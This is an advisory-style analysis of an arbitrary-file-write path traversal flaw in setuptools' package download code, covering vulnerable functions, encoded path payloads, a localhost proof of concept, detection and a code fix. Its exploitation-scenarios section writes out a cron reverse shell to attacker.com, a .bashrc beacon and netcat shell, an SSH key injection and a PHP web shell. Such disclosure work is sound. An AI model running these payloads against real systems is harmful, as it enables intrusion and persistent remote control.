# Deep Dive: Setuptools Path Traversal Vulnerability

## Executive Summary

This document provides a comprehensive technical analysis of a path traversal vulnerability discovered in setuptools' `package_index.py` module. The vulnerability allows an attacker to write files to arbitrary locations on the filesystem by exploiting improper handling of URL-encoded absolute paths during package downloads.

---

## Table of Contents

1. [Vulnerability Overview](#vulnerability-overview)
2. [Affected Code Analysis](#affected-code-analysis)
3. [Attack Chain Walkthrough](#attack-chain-walkthrough)
4. [Python's os.path.join Behavior](#pythons-ospathjoin-behavior)
5. [URL Parsing Deep Dive](#url-parsing-deep-dive)
6. [Sanitization Analysis](#sanitization-analysis)
7. [Code Flow Diagram](#code-flow-diagram)
8. [Exploitation Scenarios](#exploitation-scenarios)
9. [Detection and Mitigation](#detection-and-mitigation)
10. [Proof of Concept Explained](#proof-of-concept-explained)

---

## Vulnerability Overview

| Field | Value |
|-------|-------|
| **Component** | `setuptools/package_index.py` |
| **Vulnerable Function** | `PackageIndex._download_url()` |
| **Lines** | 810-825 |
| **CWE Classification** | CWE-22 (Improper Limitation of a Pathname to a Restricted Directory) |
| **Attack Vector** | Network (malicious package index) |
| **Impact** | Arbitrary file write |

### Root Cause Summary

The vulnerability exists because:

1. `egg_info_for_url()` extracts and URL-decodes the filename from a URL
2. The sanitization only removes `..` sequences, not absolute paths
3. `os.path.join(tmpdir, absolute_path)` ignores `tmpdir` when the second argument is absolute
4. The file is written to the attacker-controlled absolute path

---

## Affected Code Analysis

### Function: `egg_info_for_url()` (Lines 105-113)

```python
def egg_info_for_url(url):
    parts = urllib.parse.urlparse(url)
    _scheme, server, path, _parameters, _query, fragment = parts
    base = urllib.parse.unquote(path.split('/')[-1])  # <-- CRITICAL: URL decoding happens here
    if server == 'sourceforge.net' and base == 'download':  # XXX Yuck
        base = urllib.parse.unquote(path.split('/')[-2])
    if '#' in base:
        base, fragment = base.split('#', 1)
    return base, fragment
```

#### Analysis:

1. **Line 106**: Parses the URL into components using `urllib.parse.urlparse()`
2. **Line 108**: Extracts the last path component using `path.split('/')[-1]`
3. **Line 108**: **CRITICAL** - Applies `urllib.parse.unquote()` which decodes URL-encoded characters

#### The Problem:

When the URL is `http://evil.com/packages/%2Fetc%2Fpasswd`:
- `path` = `/packages/%2Fetc%2Fpasswd`
- `path.split('/')` = `['', 'packages', '%2Fetc%2Fpasswd']`
- `path.split('/')[-1]` = `%2Fetc%2Fpasswd`
- `urllib.parse.unquote('%2Fetc%2Fpasswd')` = `/etc/passwd`

The function returns `/etc/passwd` as the filename.

---

### Function: `_download_url()` (Lines 810-825)

```python
def _download_url(self, url, tmpdir):
    # Determine download filename
    #
    name, _fragment = egg_info_for_url(url)  # <-- Gets "/etc/passwd"
    if name:
        while '..' in name:
            name = name.replace('..', '.').replace('\\', '_')  # <-- Only sanitizes ".."
    else:
        name = "__downloaded__"  # default if URL has no path contents

    if name.endswith('.egg.zip'):
        name = name[:-4]  # strip the extra .zip before download

    filename = os.path.join(tmpdir, name)  # <-- VULNERABLE: tmpdir ignored if name is absolute

    return self._download_vcs(url, filename) or self._download_other(url, filename)
```

#### Line-by-Line Analysis:

| Line | Code | Purpose | Security Issue |
|------|------|---------|----------------|
| 813 | `name, _fragment = egg_info_for_url(url)` | Extract filename from URL | Returns URL-decoded absolute path |
| 814-816 | `while '..' in name: ...` | Sanitize directory traversal | Only handles `..`, not absolute paths |
| 818 | `name = "__downloaded__"` | Default filename | Safe fallback |
| 820-821 | `if name.endswith('.egg.zip'): ...` | Strip .zip extension | Benign |
| 823 | `filename = os.path.join(tmpdir, name)` | Construct full path | **VULNERABLE** |
| 825 | `return self._download_vcs(...) or self._download_other(...)` | Perform download | File written to `filename` |

---

### Function: `_download_other()` (Lines 871-877)

```python
def _download_other(self, url, filename):
    scheme = urllib.parse.urlsplit(url).scheme
    if scheme == 'file':  # pragma: no cover
        return urllib.request.url2pathname(urllib.parse.urlparse(url).path)
    # raise error if not allowed
    self.url_ok(url, True)
    return self._attempt_download(url, filename)  # <-- filename is the absolute path
```

This function receives the already-corrupted `filename` and passes it to `_attempt_download()`.

---

### Function: `_attempt_download()` (Lines 882-887)

```python
def _attempt_download(self, url, filename):
    headers = self._download_to(url, filename)  # <-- Writes to filename
    if 'html' in headers.get('content-type', '').lower():
        return self._invalid_download_html(url, headers, filename)
    else:
        return filename
```

---

### Function: `_download_to()` (Lines 740-769)

```python
def _download_to(self, url, filename):
    self.info("Downloading %s", url)
    # Download the file
    fp = None
    try:
        checker = HashChecker.from_url(url)
        fp = self.open_url(url)
        if isinstance(fp, urllib.error.HTTPError):
            raise DistutilsError(f"Can't download {url}: {fp.code} {fp.msg}")
        headers = fp.info()
        blocknum = 0
        bs = self.dl_blocksize
        size = -1
        if "content-length" in headers:
            sizes = headers.get_all('Content-Length')
            size = max(map(int, sizes))
            self.reporthook(url, filename, blocknum, bs, size)
        with open(filename, 'wb') as tfp:  # <-- FILE WRITTEN HERE
            while True:
                block = fp.read(bs)
                if block:
                    checker.feed(block)
                    tfp.write(block)  # <-- Attacker content written
                    blocknum += 1
                    self.reporthook(url, filename, blocknum, bs, size)
                else:
                    break
            self.check_hash(checker, filename, tfp)
        return headers
```

**Line 758** is where the actual file write occurs: `with open(filename, 'wb') as tfp`

At this point, `filename` is `/etc/passwd` (or any attacker-controlled path), and the attacker's payload is written to it.

---

## Attack Chain Walkthrough

```
Step 1: Attacker Setup
━━━━━━━━━━━━━━━━━━━━━━
Attacker controls a package index server that serves:

    <a href="/%2Fetc%2Fcron.d%2Fbackdoor">package-1.0.tar.gz</a>

The href contains: /%2Fetc%2Fcron.d%2Fbackdoor
URL-decoded:       /etc/cron.d/backdoor


Step 2: Victim Triggers Download
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Victim runs:
    easy_install --index-url http://evil.com/simple/ package

Or uses PackageIndex directly in code.


Step 3: URL Parsing (egg_info_for_url)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
url = "http://evil.com/%2Fetc%2Fcron.d%2Fbackdoor"

urlparse(url).path = "/%2Fetc%2Fcron.d%2Fbackdoor"
path.split('/')[-1] = "%2Fetc%2Fcron.d%2Fbackdoor"
unquote(...)        = "/etc/cron.d/backdoor"

Returns: ("/etc/cron.d/backdoor", "")


Step 4: Sanitization Bypass (_download_url)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
name = "/etc/cron.d/backdoor"

while '..' in name:    # FALSE - no ".." in name
    # This loop never executes!

name remains: "/etc/cron.d/backdoor"


Step 5: Path Construction (os.path.join)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
tmpdir = "/tmp/easy_install-abc123"
name   = "/etc/cron.d/backdoor"

os.path.join(tmpdir, name)
    │
    └── Returns: "/etc/cron.d/backdoor"

    Python's os.path.join IGNORES the first argument
    when the second argument is an absolute path!


Step 6: File Write (_download_to)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
filename = "/etc/cron.d/backdoor"

with open(filename, 'wb') as tfp:
    tfp.write(attacker_payload)

RESULT: Attacker's payload written to /etc/cron.d/backdoor
```

---

## Python's os.path.join Behavior

This is the core of the vulnerability. Python's `os.path.join()` has a documented behavior that is often misunderstood:

### Documentation (from Python docs):

> If a component is an absolute path, all previous components are thrown away and joining continues from the absolute path component.

### Demonstration:

```python
>>> import os
>>> os.path.join("/safe/directory", "relative/path")
'/safe/directory/relative/path'  # Expected - both components used

>>> os.path.join("/safe/directory", "/etc/passwd")
'/etc/passwd'  # DANGEROUS - first component ignored!

>>> os.path.join("/safe/directory", "../../../etc/passwd")
'/safe/directory/../../../etc/passwd'  # Traversal, but still rooted

>>> os.path.join("/tmp/download", "/etc/cron.d/backdoor")
'/etc/cron.d/backdoor'  # Complete escape!
```

### Why This Is Dangerous:

Developers often assume `os.path.join(base, user_input)` will always produce a path under `base`. This is **false** when `user_input` is absolute.

### Secure Pattern:

```python
# INSECURE
filename = os.path.join(tmpdir, user_controlled_name)

# SECURE
if os.path.isabs(user_controlled_name):
    raise SecurityError("Absolute paths not allowed")
filename = os.path.join(tmpdir, user_controlled_name)
# Also verify result is under tmpdir
if not os.path.realpath(filename).startswith(os.path.realpath(tmpdir) + os.sep):
    raise SecurityError("Path escapes base directory")
```

---

## URL Parsing Deep Dive

### How URLs Are Parsed:

```python
from urllib.parse import urlparse, unquote

url = "http://evil.com/packages/%2Fetc%2Fpasswd"

parts = urlparse(url)
# ParseResult(
#     scheme='http',
#     netloc='evil.com',
#     path='/packages/%2Fetc%2Fpasswd',  # Still encoded
#     params='',
#     query='',
#     fragment=''
# )

# Extract filename (last path component)
path = parts.path                        # '/packages/%2Fetc%2Fpasswd'
components = path.split('/')             # ['', 'packages', '%2Fetc%2Fpasswd']
last_component = components[-1]          # '%2Fetc%2Fpasswd'

# URL decode
filename = unquote(last_component)       # '/etc/passwd'
```

### URL Encoding Reference:

| Character | Encoded | Notes |
|-----------|---------|-------|
| `/` | `%2F` | Path separator - critical for attack |
| `\` | `%5C` | Windows path separator |
| `:` | `%3A` | Windows drive letter separator |
| `.` | `%2E` | Can encode `..` as `%2E%2E` |
| Space | `%20` | Common encoding |

### Attack Payloads:

```
Linux absolute path:
  Encoded: %2Fetc%2Fpasswd
  Decoded: /etc/passwd

Windows absolute path:
  Encoded: C%3A%5CWindows%5Csystem.ini
  Decoded: C:\Windows\system.ini

Mixed traversal + absolute:
  Encoded: %2F..%2F..%2Fetc%2Fpasswd
  Decoded: /../../../etc/passwd (still absolute, starts with /)
```

---

## Sanitization Analysis

### Current Sanitization (Lines 814-816):

```python
if name:
    while '..' in name:
        name = name.replace('..', '.').replace('\\', '_')
```

### What It Does:

| Input | After Sanitization | Safe? |
|-------|-------------------|-------|
| `../../../etc/passwd` | `./././etc/passwd` | ✓ Yes |
| `foo/../bar` | `foo/./bar` | ✓ Yes |
| `..` | `.` | ✓ Yes |
| `/etc/passwd` | `/etc/passwd` | ✗ **NO** |
| `/tmp/malicious` | `/tmp/malicious` | ✗ **NO** |
| `C:\Windows\System32` | `C:\Windows\System32` | ✗ **NO** |

### Critical Flaw:

The sanitization **only runs when `..` is present** in the string:

```python
while '..' in name:  # If no "..", this never executes
```

This means:
1. Absolute paths without `..` are **never sanitized**
2. Backslash replacement (`\\` → `_`) only happens inside the loop
3. Windows paths like `C:\Windows` pass through unchanged if they lack `..`

### What's Missing:

```python
# Missing check 1: Absolute path detection
if os.path.isabs(name):
    name = name.lstrip('/\\')  # or raise an error

# Missing check 2: Windows drive letters
if len(name) > 1 and name[1] == ':':
    name = name.replace(':', '_')

# Missing check 3: Final path validation
final_path = os.path.join(tmpdir, name)
if not os.path.realpath(final_path).startswith(os.path.realpath(tmpdir)):
    raise SecurityError("Path escape detected")
```

---

## Code Flow Diagram

```
                    ┌─────────────────────────────────┐
                    │  Malicious URL                  │
                    │  http://evil/%2Fetc%2Fpasswd    │
                    └─────────────┬───────────────────┘
                                  │
                                  ▼
┌─────────────────────────────────────────────────────────────────────┐
│  egg_info_for_url(url)                                              │
│  ┌────────────────────────────────────────────────────────────────┐ │
│  │ urlparse(url).path = "/%2Fetc%2Fpasswd"                        │ │
│  │ path.split('/')[-1] = "%2Fetc%2Fpasswd"                        │ │
│  │ unquote("%2Fetc%2Fpasswd") = "/etc/passwd"                     │ │
│  └────────────────────────────────────────────────────────────────┘ │
│  Returns: ("/etc/passwd", "")                                       │
└─────────────────────────────────┬───────────────────────────────────┘
                                  │
                                  ▼
┌─────────────────────────────────────────────────────────────────────┐
│  _download_url(url, tmpdir="/tmp/xyz")                              │
│  ┌────────────────────────────────────────────────────────────────┐ │
│  │ name = "/etc/passwd"                                           │ │
│  │                                                                │ │
│  │ while '..' in name:   # FALSE - loop skipped                   │ │
│  │     ...                                                        │ │
│  │                                                                │ │
│  │ filename = os.path.join("/tmp/xyz", "/etc/passwd")             │ │
│  │          = "/etc/passwd"   # tmpdir IGNORED                    │ │
│  └────────────────────────────────────────────────────────────────┘ │
│  Calls: _download_other(url, "/etc/passwd")                         │
└─────────────────────────────────┬───────────────────────────────────┘
                                  │
                                  ▼
┌─────────────────────────────────────────────────────────────────────┐
│  _download_other(url, filename="/etc/passwd")                       │
│  ┌────────────────────────────────────────────────────────────────┐ │
│  │ scheme = "http"                                                │ │
│  │ self.url_ok(url, True)  # URL validation - passes              │ │
│  └────────────────────────────────────────────────────────────────┘ │
│  Calls: _attempt_download(url, "/etc/passwd")                       │
└─────────────────────────────────┬───────────────────────────────────┘
                                  │
                                  ▼
┌─────────────────────────────────────────────────────────────────────┐
│  _attempt_download(url, filename="/etc/passwd")                     │
│  ┌────────────────────────────────────────────────────────────────┐ │
│  │ headers = self._download_to(url, "/etc/passwd")                │ │
│  └────────────────────────────────────────────────────────────────┘ │
│  Calls: _download_to(url, "/etc/passwd")                            │
└─────────────────────────────────┬───────────────────────────────────┘
                                  │
                                  ▼
┌─────────────────────────────────────────────────────────────────────┐
│  _download_to(url, filename="/etc/passwd")                          │
│  ┌────────────────────────────────────────────────────────────────┐ │
│  │ fp = self.open_url(url)  # Fetch from attacker server          │ │
│  │                                                                │ │
│  │ with open("/etc/passwd", 'wb') as tfp:  # <-- WRITE OCCURS     │ │
│  │     while True:                                                │ │
│  │         block = fp.read(8192)                                  │ │
│  │         tfp.write(block)  # Attacker payload written!          │ │
│  └────────────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────────┘
                                  │
                                  ▼
                    ┌─────────────────────────────────┐
                    │  /etc/passwd OVERWRITTEN        │
                    │  with attacker's payload        │
                    └─────────────────────────────────┘
```

---

## Exploitation Scenarios

### Scenario 1: Cron Job Installation

**Target:** `/etc/cron.d/backdoor`

```
Malicious URL: http://evil.com/%2Fetc%2Fcron.d%2Fbackdoor

Payload served:
* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'

Result: Reverse shell every minute
```

### Scenario 2: SSH Key Injection

**Target:** `/root/.ssh/authorized_keys`

```
Malicious URL: http://evil.com/%2Froot%2F.ssh%2Fauthorized_keys

Payload served:
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... attacker@evil.com

Result: Attacker gains SSH access as root
```

### Scenario 3: Shell Profile Backdoor

**Target:** `/home/user/.bashrc`

```
Malicious URL: http://evil.com/%2Fhome%2Fuser%2F.bashrc

Payload served:
# Original .bashrc contents...
curl http://attacker.com/beacon?host=$(hostname)
/bin/bash -c 'nohup nc -e /bin/bash attacker.com 4444 &' 2>/dev/null

Result: Backdoor executes on every new shell
```

### Scenario 4: Web Shell

**Target:** `/var/www/html/shell.php`

```
Malicious URL: http://evil.com/%2Fvar%2Fwww%2Fhtml%2Fshell.php

Payload served:
<?php system($_GET['cmd']); ?>

Result: Web shell accessible at http://victim.com/shell.php?cmd=id
```

---

## Detection and Mitigation

### Detection Methods:

1. **Log Analysis**: Look for downloads with URL-encoded absolute paths
   ```
   Pattern: %2F[a-z]+ in download URLs
   ```

2. **File Integrity Monitoring**: Alert on unexpected file creations in sensitive directories

3. **Network Monitoring**: Watch for connections to untrusted package indexes

### Mitigation:

#### Short-term (Workaround):
- Only use HTTPS connections to trusted package indexes
- Pin package versions in requirements.txt
- Use hash verification for all packages

#### Long-term (Code Fix):

```python
def _download_url(self, url, tmpdir):
    name, _fragment = egg_info_for_url(url)
    if name:
        while '..' in name:
            name = name.replace('..', '.').replace('\\', '_')

        # FIX 1: Strip absolute path prefixes
        if os.path.isabs(name):
            name = name.lstrip('/\\')

        # FIX 2: Handle Windows drive letters
        if len(name) > 1 and name[1] == ':':
            name = name[0] + '_' + name[2:]
    else:
        name = "__downloaded__"

    if name.endswith('.egg.zip'):
        name = name[:-4]

    filename = os.path.join(tmpdir, name)

    # FIX 3: Validate final path is under tmpdir
    real_filename = os.path.realpath(filename)
    real_tmpdir = os.path.realpath(tmpdir)
    if not real_filename.startswith(real_tmpdir + os.sep):
        raise DistutilsError(
            f"Security error: download path escapes temp directory: {filename}"
        )

    return self._download_vcs(url, filename) or self._download_other(url, filename)
```

---

## Proof of Concept Explained

### poc_direct_download.py

This is the simplest PoC that demonstrates the vulnerability:

```python
# 1. Start a simple HTTP server that serves a payload
server = socketserver.TCPServer(("127.0.0.1", 0), SimpleServer)

# 2. Create URL with encoded absolute path as filename
TARGET = "/tmp/CVE_PROOF.txt"
encoded = quote(TARGET, safe='')  # "%2Ftmp%2FCVE_PROOF.txt"
url = f"http://127.0.0.1:{port}/pkg/{encoded}"

# 3. Show what egg_info_for_url extracts
name, _ = egg_info_for_url(url)
print(name)  # "/tmp/CVE_PROOF.txt"

# 4. Create PackageIndex and call vulnerable function
pi = PackageIndex()
with tempfile.TemporaryDirectory() as tmpdir:
    result = pi._download_url(url, tmpdir)
    # result = "/tmp/CVE_PROOF.txt" (outside tmpdir!)

# 5. Verify file was written
assert os.path.exists(TARGET)  # TRUE - vulnerability confirmed
```

### Why It Works:

1. The URL `http://host/pkg/%2Ftmp%2FCVE_PROOF.txt` contains an encoded absolute path
2. `egg_info_for_url()` decodes this to `/tmp/CVE_PROOF.txt`
3. The sanitization loop doesn't run (no `..` in the string)
4. `os.path.join(tmpdir, "/tmp/CVE_PROOF.txt")` returns `/tmp/CVE_PROOF.txt`
5. The payload is written to `/tmp/CVE_PROOF.txt`

---

## Conclusion

This vulnerability represents a critical security flaw in setuptools' package downloading mechanism. The combination of:

1. URL decoding producing absolute paths
2. Insufficient sanitization (only checking for `..`)
3. Python's `os.path.join()` behavior with absolute paths
4. Direct file write operations

...creates a reliable arbitrary file write primitive that can be exploited by any attacker who can serve a malicious package index or perform a man-in-the-middle attack on package downloads.

### Key Takeaways:

- **Always validate** that constructed paths remain within expected directories
- **Never trust** URL-decoded user input without sanitization
- **Understand** how `os.path.join()` handles absolute paths
- **Defense in depth**: Validate at multiple layers, not just one

---

## References

- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)
- [Python os.path.join documentation](https://docs.python.org/3/library/os.path.html#os.path.join)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [setuptools GitHub Repository](https://github.com/pypa/setuptools)
